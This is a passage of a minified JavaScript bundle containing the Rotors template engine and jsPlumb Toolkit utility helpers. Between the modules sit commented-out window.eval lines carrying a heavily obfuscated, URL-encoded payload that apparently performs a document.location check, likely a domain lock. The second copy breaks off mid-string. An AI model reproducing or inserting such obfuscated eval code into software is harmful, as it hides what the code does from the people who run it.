            b.hasOwnProperty(c) && (a[c] = b[c])
    };
    E(D.prototype, {
        bindings: {},
        entries: {},
        executions: {},
        bind: t,
        defaultTemplate: "<div></div>",
        defaultCompiledTemplate: null,
        setDefaultTemplate: function(a) {
            null != a ? (this.defaultTemplate = a,
            this.defaultCompiledTemplate = this.compile(this.parse(a))) : this.clearDefaultTemplate()
        },
        clearDefaultTemplate: function() {
            this.defaultTemplate = null,
            this.defaultCompiledTemplate = null
        },
        clearCache: function() {
            this.cache = {},
            this.templateCache = {}
        },
        namespaceHandlers: {
            svg: function(a) {
                return "e = document.createElementNS('http://www.w3.org/2000/svg', '" + a.split(":")[1] + "');e.setAttribute('version', '1.1');e.setAttribute('xmlns', 'http://www.w3.org/1999/xhtml');"
            }
        },
        namespaces: {
            xlink: "http://www.w3.org/1999/xlink"
        },
        each: function(a, b, c, d) {
            var e;
            if (j(a))
                for (e = 0; e < a.length; e++)
                    b(a[e], c, e, d);
            else
                for (e in a)
                    a.hasOwnProperty(e) && b({
                        $key: e,
                        $value: a[e]
                    }, c, e, d)
        },
        openRe: new RegExp("<([^/>]*?)>$|<([^/].*[^/])>$"),
        closeRe: new RegExp("^</([^>]+)>"),
        openCloseRe: new RegExp("<(.*)(/>$)"),
        tokenizerRe: /(<[^\^>]+\/>)|(<!--[\s\S]*?-->)|(<[\/a-zA-Z0-9\-:]+(?:\s*[a-zA-Z\-]+=\"[^\"]*\"|\s*[a-zA-Z\-]+='[^']+'|\s*[a-zA-Z\-]|\s*\{\{.*\}\})*>)/,
        commentRe: /<!--[\s\S]*?-->/,
        attributesRe: /([a-zA-Z0-9\-_:]+="[^"]*")|(\{\{if [^(?:\}\})]+\}\}.*\{\{\/if\}\})/,
        inlineIfRe: /\{\{if ([^\}]+)\}\}(.*)\{\{\/if\}\}/,
        singleExpressionRe: /^[\s]*\$\{([^\}]*)\}[\s]*$/,
        parseAttributes: function(a) {
            return null == a ? a : this.filterEmpty(a.replace("/>", ">").split(/^<|>$/)[1].split(this.attributesRe))
        },
        map: l,
        flatten: k,
        filter: m,
        data: h,
        uuid: r,
        filterEmpty: function(a) {
            return m(a, function(a) {
                return null != a && n(a).length > 0
            })
        },
        isBrowser: function() {
            return "undefined" != typeof navigator
        }(),
        isOldIE: function() {
            return d
        },
        cf: function() {
            return this.isBrowser ? this.isOldIE() ? a.document.createElement("div") : a.document.createDocumentFragment() : new y
        },
        ctn: function(b) {
            return this.isBrowser ? a.document.createTextNode(b) : new A(b)
        },
        ce: function(b) {
            return this.isBrowser ? a.document.createElement(b) : new z(b)
        },
        customElements: {
            "r-each": {
                parse: function(a, b, c, d) {
                    a.context = a.atts.in,
                    a.type = "each"
                },
                compile: function(a) {
                    var b = function() {
                        var b = "function(item, _rotorsLoopId, _rotorsLoopIndex, _rotorsLoopContext) { ";
                        b += "data.unshift(item);$value=item;$key=_rotorsLoopIndex;";
                        for (var c = 0; c < this.children.length; c++)
                            b += this.children[c].compile(a);
                        return b += "data.splice(0,1);",
                        b += "}"
                    }
                    .bind(this)
                      , c = ";_rotors.te(null, _eid, '" + this.uuid + "');"
                      , d = this.context ? ';data.unshift(_rotors.data(data[0], "' + this.context + '"));' : ""
                      , e = "_rotors.each(data[0], " + b() + ",'" + this.uuid + "', '" + this.context.replace(/'/g, "\\'") + "');"
                      , f = this.context ? ";data.splice(0, 1);" : ""
                      , g = ";_rotors.pet(_eid, '" + this.uuid + "');";
                    return c + d + e + f + g
                }
            },
            "r-if": {
                parse: function(a, b, c, d) {
                    a.test = a.atts.test
                },
                compile: function(a) {
                    var b, c = "", d = "", e = this.happyFlowChildren || this.children;
                    for (b = 0; b < e.length; b++)
                        c += e[b].compile(a) + ";";
                    if (null != this.happyFlowChildren) {
                        for (d = "else {",
                        b = 0; b < this.children.length; b++)
                            d += this.children[b].compile(a) + ";";
                        d += "}"
                    }
                    return ";with (data[0]) { if(" + this.test + ") { " + c + " }" + d + "}"
                }
            },
            "r-else": {
                remove: !0,
                parse: function(a, b, c, d, e) {
                    var f = I.peek(e);
                    null != f && "r-if" === f.tag && (f.happyFlowChildren = f.children,
                    f.children = [])
                },
                compile: function(a) {}
            },
            "r-for": {
                parse: function(a, b, c, d, e) {
                    a.loop = a.atts.loop
                },
                compile: function(a) {
                    var b = "";
                    b += "var __limit; with(data[0]){__limit=(" + this.loop + ");}",
                    b += "for(var $index=0;$index<__limit;$index++){data[0].$index=$index;";
                    for (var c = 0; c < this.children.length; c++)
                        b += this.children[c].compile(a) + ";";
                    return b += "}delete data[0].$index;"
                }
            },
            "r-tmpl": {
                remove: !0,
                parse: function(a, b, c, d, e, f) {
                    if (a.type = "template",
                    a.context = a.atts.context,
                    a.atts.lookup)
                        a.lookup = a.atts.lookup,
                        a.default = a.atts.default || "",
                        a.compile = function(b) {
                            return ';with(data[0]){var tlid=eval("' + a.lookup.replace(/[\$\{\}]/g, "") + '");}if (_rotors.templateCache[tlid] == null){var ___t = _rotors.templateResolver(tlid) || _rotors.templateResolver("' + a.default + '");_rotors.templateCache[tlid]=_rotors.compile(_rotors.parse(___t));} eval(_rotors.templateCache[tlid].functionBody);'
                        }
                        ;
                    else {
                        a.templateId = a.atts.id;
                        var g = s(e);
                        if (f.indexOf(a.templateId) !== -1) {
                            if (!g)
                                throw new TypeError("recursive template call [" + a.templateId + "]");
                            a.compile = function(b) {
                                return ";eval(_rotors.templateCache['" + a.templateId + "'].functionBody);"
                            }
                        } else {
                            var h = c(a.templateId);
                            f.push(a.templateId);
                            var i = d.parse(h, c, null, f);
                            null == d.templateCache[a.templateId] && (d.templateCache[a.templateId] = d.compile(i));
                            for (var j = 0; j < i.length; j++)
                                i[j].context = a.context;
                            d.debug("nested ast", i),
                            a.children = i,
                            f.pop()
                        }
                    }
                },
                precompile: function(a) {
                    return this.context ? ';data.unshift(_rotors.data(data[0], "' + this.context + '"));' : ""
                },
                postcompile: function(a) {
                    return this.context ? ";data.splice(0, 1);" : ""
                }
            },
            "r-html": {
                parse: function(a, b, c, d) {},
                compile: function(a) {
                    return ";var __hp=_rotors.parse(data[0].value),__hc=_rotors.compile(__hp,true);var __f=__hc(data[0], _rotors);Rotors.peek(_els).appendChild(__f.childNodes[0]);"
                }
            }
        },
        globalTags: {},
        registerTag: function(a, b, c) {
            this[c ? "globalTags" : "customTags"][a] = new e(this,a,b)
        },
        setAttribute: function(a, b, c) {
            var d = b.split(":");
            1 === d.length || null == this.namespaces[d[0]] ? a.setAttribute(d[0], c) : a.setAttributeNS(this.namespaces[d[0]], d[1], c)
        },
        setToggleManager: function(a) {
            this.toggleManager = a
        },
        debugEnabled: !1,
        debug: function() {
            this.debugEnabled && console.log.apply(console, arguments)
        },
        maybeDebug: function() {
            this.debugEnabled && arguments[0] && console.log.apply(console, arguments)
        },
        parse: function(a, b, c, d) {
            d = d || [],
            b = C(this, b || this.templateResolver, null);
            var e = []
              , g = []
              , h = this
              , i = function(a, b) {
                var c = a.match(b);
                return null != c && c
            }
              , j = function() {
                return e.length > 0 ? e[e.length - 1] : null
            }
              , k = function(a) {
                var b = j();
                return null != b && b.tag == a
            }
              , l = function(a, b) {
                e.length > 0 && j().children.push(a),
                b ? 0 == e.length && g.push(a) : e.push(a)
            }
              , m = function(a) {
                l(a, !0)
            }
              , p = function() {
                var a = e.pop();
                if (0 !== e.length || a.discard) {
                    if (a.discard) {
                        var b = I.peek(e);
                        b && b.children.pop()
                    }
                } else
                    g.push(a);
                return a
            }
              , q = function(a, b, c, d, f) {
                var g = new v(a,d)
                  , h = d.customElements[g.tag];
                return h && (h.parse(g, b, c, d, e, f),
                h.compile && (g.compile = h.compile),
                g.precompile = h.precompile,
                g.postcompile = h.postcompile,
                g.custom = !0,
                g.remove = h.remove,
                d.debug("  element is a custom element"),
                d.maybeDebug(g.remove, "  element's root should not appear in output")),
                g
            }
              , r = [{
                re: h.commentRe,
                handler: function(a, b, c, d) {
                    d.debug("comment", a, b),
                    l(new w(a), !0)
                }
            }, {
                re: h.openRe,
                handler: function(a, b, c, d, e) {
                    d.debug("open element", a, b);
                    var f = q(a, b, c, d, e);
                    l(f, f.remove)
                }
            }, {
                re: h.closeRe,
                handler: function(a, b, c, d) {
                    d.debug("close element", a, b);
                    var e = d.customElements[b[1]];
                    if (null == e || !e.remove) {
                        if (!k(b[1]))
                            throw new TypeError("Unbalanced closing tag '" + b[1] + "'; opening tag was '" + p().tag + "'");
                        p()
                    }
                }
            }, {
                re: h.openCloseRe,
                handler: function(a, b, c, d, e) {
                    d.debug("open and close element", a, b);
                    var f = q(a, b, c, d, e);
                    l(f, !0)
                }
            }, {
                re: /.*/,
                handler: function(a, b, c, d) {
                    d.debug("text node", a);
                    var e = new x({
                        value: a
                    },d);
                    m(e),
                    o("__element", a, e, null, d)
                }
            }];
            if (f(n(a).split(this.tokenizerRe), function(a, c) {
                for (var e = n(c), f = 0; f < r.length; f++) {
                    var g = i(e, r[f].re);
                    if (g) {
                        r[f].handler(c, g, b, this, d);
                        break
                    }
                }
            }
            .bind(this)),
            g.length > 0 && c)
                for (var s in c)
                    g[0][s] = c[s];
            return g
        },
        compile: function(a, b, c, d) {
            for (var e = "data=[data||{}];var frag=_rotors.cf(),_els=[],e,_le,__a,$value,$key,_eid = _rotors.nec();_els.push(frag);", f = "return frag;", g = [], h = 0; h < a.length; h++) {
                var i = "";
                a[h].precompile && (i += a[h].precompile(this)),
                i += a[h].compile(this, d),
                a[h].postcompile && (i += a[h].postcompile(this)),
                g.push(i)
            }
            var j = g.join("");
            if (this.debug("function body :", j),
            c)
                return j;
            var k = new Function("data,_rotors",e + j + f)
              , l = this;
            if (b)
                return k;
            var m = function(a) {
                return k.apply(this, [a, l])
            };
            return m.functionBody = j,
            m
        },
        nec: function() {
            var a = this.uuid();
            return this.executions[a] = {
                current: [{
                    children: []
                }]
            },
            a
        },
        te: function(a, b, c, d) {
            var e = {
                el: a,
                children: [],
                id: c,
                index: d
            };
            this.executions[b].current[0].children.push(e);
            var f = c + (null != d ? "-" + d : "");
            this.executions[b][f] = e,
            this.executions[b].current.unshift(e)
        },
        pet: function(a, b) {
            this.executions[a].current = this.executions[a].current.splice(1)
        },
        getExecutionContent: function(a, b, c, d, e) {
            var f = null != d ? this.namespaceHandlers[d](a) : c ? "e=_rotors.ctn(" + a + ");" : "e=_rotors.ce('" + a + "');";
            return f + "Rotors.peek(_els).appendChild(e);" + (c ? "" : "_els.push(e);") + "e._rotors=_rotors.entries['" + b + "'];e._rotorsEid=_eid;if(typeof _rotorsLoopId !== 'undefined') {e._rotorsLoopId=_rotorsLoopId;e._rotorsLoopIndex=_rotorsLoopIndex;e._rotorsLoopContext=_rotorsLoopContext;}_rotors.te(e, _eid, '" + b + "', typeof _rotorsLoopIndex != 'undefined' ? _rotorsLoopIndex : null);"
        },
        updaters: {},
        onUpdate: function(a, b) {
            if (null != a._rotors) {
                var c = a._rotors.instance;
                a._RotorsUpdate = a._RotorsUpdate || r(),
                c.updaters[a._RotorsUpdate] = c.updaters[a._RotorsUpdate] || [],
                c.updaters[a._RotorsUpdate].push(b)
            }
        },
        update: function(a, b) {
            var c, d, e, f = [], g = a._rotorsEid;
            if (null != g && null != a._rotors) {
                e = a._rotors.instance,
                c = e.executions[g];
                var h = a._rotorsLoopIndex
                  , i = a._rotors.uuid + (null != h ? "-" + h : "");
                d = c[i];
                var j = function(a, b, c) {
                    null != a && (a._rotors.update(a, b),
                    a._RotorsUpdate && e.updaters[a._RotorsUpdate] && f.push([a, e.updaters[a._RotorsUpdate], b]));
                    for (var d = 0; d < c.children.length; d++) {
                        var g = e.entries[c.children[d].id]
                          , h = "each" === e.entries[c.id].type
                          , i = h && null != c.children[d].el && null != c.children[d].el._rotorsLoopIndex ? b[c.children[d].el._rotorsLoopIndex] : e.data(b, g.context);
                        j(c.children[d].el, i, c.children[d])
                    }
                };
                j(a, b, d);
                for (var k = 0; k < f.length; k++)
                    for (var l = f[k], m = 0; m < l[1].length; m++)
                        try {
                            l[1][m](l[0], l[2])
                        } catch (a) {}
            }
        },
        updateExternal: function(a, b) {
            b = b || {};
            var c, d, e, f = function(a) {
                if (a.nodeType === Node.ELEMENT_NODE) {
                    for (var g = 0, i = a.attributes.length; g < i; g++)
                        c = a.attributes[g],
                        "rotors" === c.name ? (d = c.value,
                        a.innerHTML = h(b, d)) : 0 === c.name.indexOf("rotors-") && (d = c.value,
                        e = c.name.substring(7),
                        a.setAttribute(e, h(b, d)));
                    for (g = 0; g < a.childNodes.length; g++)
                        f(a.childNodes[g])
                }
            };
            f(a)
        },
        remove: function(a) {
            a._RotorsUpdate && this.updaters[a._RotorsUpdate] && delete this.updaters[a._RotorsUpdate],
            a._rotorsEid && this.executions[a._rotorsEid] && delete this.executions[a._rotorsEid]
        },
        template: function(a, b, c, d) {
            var e, f = d ? null : this.templateCache[a];
            if (null != f)
                return e = f(b),
                this.isOldIE() ? e.childNodes[0] : e;
            c = C(this, c || this.templateResolver, d);
            var g = c(a);
            if (null != g) {
                var h = this.parse(g, c, null, [a])
                  , i = this.compile(h);
                return this.templateCache[a] = i,
                e = i(b),
                this.isOldIE() ? e.childNodes[0] : e
            }
            return this.cf()
        },
        precompileTemplate: function(a, b) {
            var c = this.parse(a, b || this.templateResolver);
            return this.compile(c, !0)
        },
        precompileTemplates: function(a, b) {
            var c = function(c) {
                var d = a[c];
                return d || (b || this.templateResolver)(c)
            }
              , d = {};
            for (var e in a)
                d[e] = this.precompileTemplate(a[e], c);
            return d
        },
        importTemplate: function(a, b) {
            var c = this;
            b = "string" == typeof b ? Function("data", "_rotors", b) : b,
            this.templateCache[a] = function(a) {
                return b.apply(c, [a, c])
            }
        },
        importTemplates: function(a) {
            for (var b in a)
                this.importTemplate(b, a[b])
        },
        importBindings: function(a) {
            this.bindings = this.bindings || {};
            for (var b in a) {
                var c = a[b];
                this.bindings[b] = {
                    e: c.e,
                    u: c.u,
                    w: c.w,
                    reapply: Function("$data", c.reapply)
                }
            }
        }
    });
    var F = function(a) {
        return new D(a)
    }
      , G = function(a) {
        var b = {};
        for (var c in a.bindings) {
            var d = a.bindings[c];
            b[c] = {
                e: d.e,
                u: d.u,
                w: d.w,
                reapply: String(d.reapply).replace(/^function\s*\S+\s*\([^)]*\)\s*\{|\}$/g, "")
            }
        }
        return b
    }
      , H = function(b, c) {
        c = c || "rotors";
        var d, e = a.Rotors.newInstance(), f = {}, g = new RegExp("<script type=['\"]" + c + "['\"] id=['\"]([^'\"]+)['\"]>((.*\n)*?)</script>","g");
        d = b.replace(g, function(a, b, c) {
            return f[b] = c,
            ""
        });
        var h = [{}, null, d];
        for (var i in f)
            h[0][i] = String(e.precompileTemplate(f[i], function(a) {
                return f[a]
            })).replace(/^function\s*\S+\s*\([^)]*\)\s*\{|\}$/g, "");
        return h[1] = G(e),
        h
    }
      , I = a.Rotors = {
        newInstance: F,
        precompile: H,
        data: h,
        version: "0.3.17",
        peek: b
    };
    "undefined" != typeof exports && (exports.Rotors = I,
    exports.RotorsInstance = D)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = this;
    a.jsPlumbToolkitUtil = a.jsPlumbToolkitUtil || {};
    var b = a.jsPlumbToolkitUtil
      , c = function(a, b) {
        return function() {
            return a.apply(b, arguments)
        }
    };
    b.requestAnimationFrame = c(a.requestAnimationFrame || a.webkitRequestAnimationFrame || a.mozRequestAnimationFrame || a.oRequestAnimationFrame || a.msRequestAnimationFrame || function(b, c) {
        a.setTimeout(b, 10)
    }
    , a);
    b.ajax = function(a) {
        var b = window.XMLHttpRequest ? new XMLHttpRequest : new ActiveXObject("Microsoft.XMLHTTP")
          , c = a.type || "GET";
        if (b) {
            var d = "json" === a.dataType ? function(a) {
                return JSON.parse(a)
            }
            : function(a) {
                return a
            }
            ;
            b.open(c, a.url, !0);
            var e = a.headers || {};
            for (var f in e)
                b.setRequestHeader(f, e[f]);
            b.onreadystatechange = function() {
                4 === b.readyState && ("2" === ("" + b.status)[0] ? a.success(d(b.responseText)) : a.error && a.error(b.responseText, b.status))
            }
            ,
            b.send(a.data ? JSON.stringify(a.data) : null)
        } else
            a.error && a.error("ajax not supported")
    }
    ,
    b.debounce = function(a, b) {
        b = b || 150;
        var c = null;
        return function() {
            window.clearTimeout(c),
            c = window.setTimeout(a, b)
        }
    }
    ,
    b.xml = {
        setNodeText: function(a, b) {
            a.text = b;
            try {
                a.textContent = b
            } catch (a) {}
        },
        getNodeText: function(a) {
            return null != a ? a.text || a.textContent : ""
        },
        getChild: function(a, b) {
            for (var c = null, d = 0; d < a.childNodes.length; d++)
                if (1 === a.childNodes[d].nodeType && a.childNodes[d].nodeName === b) {
                    c = a.childNodes[d];
                    break
                }
            return c
        },
        getChildren: function(a, b) {
            for (var c = [], d = 0; d < a.childNodes.length; d++)
                1 === a.childNodes[d].nodeType && a.childNodes[d].nodeName === b && c.push(a.childNodes[d]);
            return c
        },
        xmlToString: function(a) {
            try {
                return (new XMLSerializer).serializeToString(a).replace(/\s*xmlns=\"http\:\/\/www.w3.org\/1999\/xhtml\"/g, "")
            } catch (b) {
                try {
                    return a.xml
                } catch (a) {
                    throw new Error("Cannot serialize XML " + a)
                }
            }
            return !1
        },
        createElement: function(a, b, c) {
            var d;
            try {
                d = new ActiveXObject("Microsoft.XMLDOM").createNode(1, a, "")
            } catch (b) {
                d = document.createElement(a)
            }
            if (c && jsPlumbToolkitUtil.xml.setNodeText(d, c),
            b)
                for (var e in b)
                    d.setAttribute(e, b[e]);
            return d
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)(